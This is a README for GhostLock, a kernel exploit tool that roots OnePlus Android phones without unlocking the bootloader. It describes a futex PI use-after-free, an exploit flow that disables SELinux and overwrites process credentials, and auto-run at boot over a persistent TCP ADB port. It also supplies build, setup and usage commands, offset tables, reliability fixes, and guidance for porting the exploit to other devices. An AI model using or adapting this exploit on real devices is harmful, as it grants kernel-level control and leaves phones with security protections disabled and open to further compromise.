# GhostLock — OnePlus Locked Bootloader Jailbreak

Kernel exploit for OnePlus devices with locked bootloader. Achieves root + KernelSU installation without unlocking bootloader or modifying boot image. Runtime auto-detection of kernel version with multi-device offset table.

## Vulnerability

**CVE-2026-43499** — Futex PI (Priority Inheritance) Use-After-Free

Affects Linux kernel 2.6.39 ~ 7.1. Fixed in mainline 7.1 (commit `3bfdc63936dd`). Android GKI 6.12.x remains vulnerable.

The `pselect6` syscall copies `fd_set` data onto the kernel stack. When combined with the futex PI waiter mechanism, a freed stack frame can be reclaimed as an `rt_mutex_waiter` structure. The rb-tree rebalance during PI chain walk then writes controlled values to arbitrary kernel addresses.

## Tested Devices

| Device | SoC | OS | Kernel | Status |
|--------|-----|-----|--------|--------|
| OnePlus Ace 6T | SM8845 (Snapdragon 8s Elite) | Android 16, ColorOS 16.0.2.403 | `6.12.38-...-ab14275539` | **Verified** |
| OnePlus Ace 6T | SM8845 (Snapdragon 8s Elite) | Android 16, ColorOS 16.0.8.301 | `6.12.38-...-ab14552068` | **Verified** |

### Untested (offsets extracted, not verified on device)

| Device | Kernel | Notes |
|--------|--------|-------|
| OnePlus 15 | `6.12.23-...-ab14541642` | Offsets extracted from OTA boot.img |

Other OnePlus devices with the same SoC family and Android 16 / kernel 6.12.x should be adaptable by extracting offsets from their `boot.img`.

## Exploit Flow

```
Write 1 (mode=1)  →  SELinux enforcing = 0
                      (low byte of kernel ptr = 0x00)

Write 2 (mode=2)  →  task->cred = init_cred
                      (uid=0, all capabilities)

Root shell         →  ksud late-load (KernelSU LKM)
                   →  su -c load_policy (fix SELinux policycap)
                   →  dynamic manager registration
```

### Bootstrap Mode (phone standalone)

```
App (seccomp)  →  Write 1 (no perf needed)
               →  mini-adb connect TCP 5555 (RSA auth)
               →  adb shell: full exploit (perf works, no seccomp)
               →  root → KSU → network fix
```

### Auto-Boot (via ReSukiSU integration)

```
BOOT_COMPLETED → BootCompletedReceiver
  ├─ su available → skip (soft reboot / already rooted)
  └─ no root → GhostlockService → setsid exploit --bootstrap
```

## Key Technical Details

### Runtime Kernel Matching

Offsets are stored in `offsets.h` as a lookup table keyed by `uname -r`. The exploit auto-selects at startup and refuses to run on unknown kernels.

```c
static const struct kernel_offsets known_offsets[] = {
  OFFSETS_ENTRY("6.12.38-android16-5-g8c67d4274c0a-ab14275539-4k", ...),
  OFFSETS_ENTRY("6.12.38-android16-5-g844001fb8721-ab14552068-4k", ...),
  OFFSETS_ENTRY("6.12.23-android16-5-gb2a876903b49-ab14541642-4k", ...),
  { .uname_r = NULL }
};
```

### perf_find_task Fix (kernel 6.12)

```c
// Bug: bit 32 invalid on ARM64 → kernel rejects REGS_INTR
pe.sample_regs_intr = (1ULL << 33) - 1;  // BROKEN — 24-byte samples, no regs

// Fix: bits 0-31 only (x0-PC)
pe.sample_regs_intr = (1ULL << 32) - 1;  // WORKS — 280-byte samples with regs
```

### Write 2 mode=2

```c
// mode=1: writes slab address to cred → UAF panic (~50%)
do_one_write(target, "W2: cred", 1);  // BROKEN

// mode=2: writes data_addr(INIT_CRED) → valid pointer, zero panic
do_one_write(target, "W2: cred", 2);  // WORKS
```

### Mini ADB Client

Built-in ADB protocol implementation (`miniadb.c`) for bootstrap mode:
- TCP connect to localhost:5555
- RSA authentication via `dlopen(libcrypto.so)`
- Shell command execution without app seccomp restrictions

### SELinux Network Fix

Write 1 corrupts `selinux_state` bytes beyond `enforcing`, breaking `netif egress` permissions. Fixed by running `load_policy` from KSU's `su` context after exploit completes.

## Build

```bash
NDK=/path/to/android-ndk
$NDK/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android35-clang \
  -O2 -Wall -Isrc -DTARGET_CONFIG_H="targets/ace6t/target.h" \
  src/targets/ace6t/main.c src/targets/ace6t/util.c src/slide.c \
  src/targets/ace6t/fops.c src/pipe.c src/root.c \
  src/targets/ace6t/miniadb.c \
  -o ghostlock -fPIE -pie -pthread
```

## Prerequisites

### ksud (required for KSU installation)

GhostLock only provides root. KernelSU installation depends on **ksud** — a binary that contains embedded `kernelsu.ko` modules for each KMI version. The root script finds ksud on device and calls `ksud late-load --kmi android16-6.12`.

| Method | Steps |
|--------|-------|
| **ReSukiSU APK** (recommended) | Install [ReSukiSU](https://github.com/ReSukiSU/ReSukiSU) or this [fork](https://github.com/JoinChang/ReSukiSU). Official release bundles `libksud.so`. |
| **CI release** | Download `ksud-aarch64-linux-android.zip` from [ReSukiSU CI](https://github.com/cctv18/ReSukiSU_CI/releases) |

> Without ksud, the exploit achieves root (uid=0) but KSU won't be installed and `su` won't persist.

## Setup (one-time)

```bash
adb tcpip 5555
adb push ~/.android/adbkey /data/local/tmp/a/adbkey
adb push ghostlock /data/local/tmp/a/e && chmod 755 /data/local/tmp/a/e
```

After first successful jailbreak, `persist.adb.tcp.port=5555` is set via `resetprop` — subsequent boots are fully automatic.

## Usage

```bash
/data/local/tmp/a/e              # Full exploit (adb shell)
/data/local/tmp/a/e --bootstrap  # Phone standalone (app context)
/data/local/tmp/a/e --write1     # SELinux disable only
```

## Adding New Devices / Kernel Versions

Only `boot.img` is needed — no root, no device access required.

### Extract offsets from boot.img

```bash
# 1. Extract kernel
python -c "import struct; d=open('boot.img','rb').read(); open('kernel','wb').write(d[4096:4096+struct.unpack_from('<I',d,8)[0]])"

# 2. Global symbols (kallsyms)
python tools/extract_target.py    # 28 offsets, auto-validated

# 3. Struct fields (BTF)
python tools/extract_btf.py kernel  # 57 offsets, auto-validated

# 4. Add to offsets.h, rebuild
```

### Coverage: 103/103 offsets from boot.img

| Source | Count | Method |
|--------|-------|--------|
| kallsyms (global symbols) | 28 | `extract_target.py` |
| BTF (struct fields) | 57 | `extract_btf.py` |
| Derived (same struct, different usage) | 9 | Automatic |
| Constants (fixed values) | 12 | No extraction needed |

### Adapting to non-OnePlus devices

The core exploit is device-agnostic. Adaptation may require:
- Different `VA_BITS` (48 vs 39) → update `target.h` memory layout
- Different timing parameters → tune `common.h`
- Different ashmem implementation (C vs Rust) → update symbol matching
- No OnePlus `secureguard` → simplifies things (one less issue)

## Files

| File | Description |
|------|-------------|
| `src/targets/ace6t/main.c` | Exploit entry, Write 1/2, bootstrap, root script |
| `src/targets/ace6t/offsets.h` | Multi-version kernel offset lookup table |
| `src/targets/ace6t/target.h` | Default offsets, memory layout, struct field constants |
| `src/targets/ace6t/util.c` | Heap spray, kernelsnitch, slab drain |
| `src/targets/ace6t/fops.c` | pselect route, PI write mechanism |
| `src/targets/ace6t/miniadb.c` | Mini ADB client (TCP + RSA auth) |
| `src/targets/ace6t/common.h` | Timing parameters, macros |
| `src/slide.c` | SLIDE kernel address leak |
| `src/pipe.c` | Pipe buffer manipulation |
| `src/root.c` | Root shell setup |
| `tools/extract_target.py` | Offset extraction from kallsyms |
| `tools/extract_btf.py` | Struct offset extraction from BTF |

## License

For authorized security research and educational purposes only.
